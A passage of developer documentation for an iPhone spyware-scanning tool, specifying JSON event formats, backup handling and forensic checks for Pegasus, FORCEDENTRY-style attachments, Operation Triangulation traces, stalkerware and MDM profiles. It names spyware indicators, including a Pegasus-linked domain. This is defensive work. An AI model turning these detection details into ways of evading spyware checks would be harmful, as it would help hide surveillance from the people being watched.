  read-only `scan` sandbox profile (no network, writes only to the workspace, SQLite opened `mode=ro&immutable=1`).
* Encrypted backups are detected (`Manifest.plist IsEncrypted`), not decrypted: only the app list and device data are
  checked and a limitation explains how to get a full check.

### `iphone devices` → one event

```jsonc
{"ev": "iphone_devices",
 "devices": [{"udid": "00008110-001A2B3C4D5E801E", "name": "iPhone (Ania)", "model": "iPhone 13",
              "product_type": "iPhone14,5", "ios": "17.6.1",
              "state": "usb|wifi|offline",            // offline = paired with this Mac, not connected now
              "trusted": true | false | null,         // false: unlock the phone and tap "Zaufaj"
              "sources": ["libimobiledevice", "devicectl", "usb"], "last_seen": "2026-10-13 09:41",
              "backup": BACKUP | null}],              // newest backup of this phone
 "backups": [BACKUP, …],                              // newest first
 "tools": {"libimobiledevice": false, "devicectl": true, "apple_backup": true, "paths": {…}},
 "access": {"mobilesync": "ok|denied|missing", "mobilesync_path": "…", "backup_dir": "<ROOT>/iphone_backups"},
 "can_backup": "idevicebackup2" | "apple" | null,    // tool used by --make-backup
 "backup_target": {"dir": "…", "free_bytes": 233057378304},
 "indicators": {"total": 8516, "built": "2026-10-13 14:46:14",
                "sources": [{"name": "MVT", "license": "MIT", "url": "…"}, …]},
 "notes": ["Polish hints: missing tools (what to install yourself), Full Disk Access, how to make a backup …"]}
```

`BACKUP = {"path", "udid", "device_name", "model", "product_type", "ios", "date": "2026-10-12 21:14",
"encrypted": false, "passcode_set": true, "complete": true, "full": false, "source": "finder|cerber"}`

### `iphone scan [UDID] [--make-backup]` / `iphone backup PATH`

Stages: `device` (only with a UDID), `backup` (only with `--make-backup`), `sandbox`, `analyze`, `report`.
`--make-backup` is sent only after the app's confirmation dialog (tens of GB, up to an hour, passcode prompt on the
phone). Progress: `{"ev":"progress","stage":"device|backup|analyze","done":3,"total":14,"current":"Historia Safari"}`
(`backup`: `done` = percent, `total` = 100, `bytes` written so far). SIGINT cancels (exit 130, `iphone_done` with
`cancelled: true` when the analysis had started). Each finding is sent as soon as it is known:
`{"ev": "iphone_finding", "item": IPHONE_FINDING}`; the end is `{"ev": "iphone_done", "summary": IPHONE_SUMMARY}`
(also written as `reports/gui-<stamp>-iphone.{json,html}` and to the history with `"mode": "iphone"`).

```jsonc
IPHONE_FINDING = {"id": "f1", "category": "spyware|stalkerware|phishing|profile|jailbreak|app|posture",
  "title": "Ślad oprogramowania szpiegującego Pegasus (NSO Group) w wiadomościach SMS/iMessage",
  "location": "Library/SMS/sms.db", "severity": "malicious|suspicious|low|info", "score": 90, "confidence": "HIGH",
  "description": "…Polish explanation…", "evidence": ["free247downloads.com ← https://… (SMS od +48…, 2026-09-30 18:02)"],
  "evidence_total": 1, "signals": ["…"], "advice": ["…what to do, Polish…"], "threat": "Pegasus (NSO Group)" | null,
  "details": {}}
IPHONE_SUMMARY = {"mode": "iphone", "title": "iPhone (Ania)", "started", "finished", "seconds", "cancelled",
  "verdict": "CLEAN|INFO|SUSPICIOUS|PUA|MALICIOUS",      // worst finding severity (same thresholds as the laptop scan)
  "coverage": "full|partial|none",                    // partial: encrypted backup / phone data only; none: nothing to judge
  "counts": {"malicious": 1, "suspicious": 1, "low": 1, "info": 0, "pua": 0},
  "device": {"name", "model", "product_type", "ios", "udid"}, "backup": BACKUP | null,
  "device_read": {"collected": ["…"], "missing": ["…"]} | null,
  "findings": [IPHONE_FINDING, …],                     // worst first
  "checks": [{"id": "sms", "title": "Wiadomości SMS/iMessage", "status": "ok|found|missing|skipped|error",
              "detail": "12 480 wiadomości, 860 linków sprawdzonych"}],
  "posture": {"ios", "lockdown_mode", "passcode_set", "mdm", "supervised", "apps_total", "apps_not_appstore",
              "backup_encrypted"},
  "apps": [{"bundle_id", "name", "source": "appstore|testflight|other_store|unknown|apple", "installed", …}],
  "apps_total": 87, "profiles": [{"name", "identifier", "uuid", "organization", "installed", "types": […]}],
  "stats": {"backup_files", "sms_messages", "sms_urls", "safari_urls", …}, "indicators": {stats of the iOS DB},
  "limitations": ["…"], "advice": ["…overall next steps…"],
  "sandbox": {"mode": "readonly", "isolation": […], "verified": […]}, "report_html": "…", "report_json": "…"}
```

What is checked (backup): Manifest.db file list (app containers, website-data origins, indicator file paths, jailbreak
files), SMS/iMessage links + senders + FORCEDENTRY-style fake GIF attachments, Safari history/tabs, Chrome/Firefox,
WebKit observations/session log, WhatsApp links, DataUsage process names (+ Operation Triangulation "BackupAgent with
traffic"), OSAnalytics process names, IDStatusCache/interactionC e-mail accounts, TCC, location clients, Shortcuts,
configuration profiles (MDM, root CA, VPN/proxy/DNS), Lockdown Mode, passcode, installed apps (indicators, stalkerware
names, not from App Store, enterprise/developer signed, sensitive permissions, recent install). Phone data: device info,
apps with signer, provisioning profiles, crash reports. Links are also checked against `ioc.sqlite` (URLhaus/ThreatFox).
Indicator names that are also real iOS daemon/file names (e.g. `BackupAgent`, `com.apple.*.plist`) count only as
"suspicious" when hit alone.

Mock: `CERBER_MOCK_IPHONE=none` (no phone, no backup, no tools), `=encrypted` (the backup is encrypted).

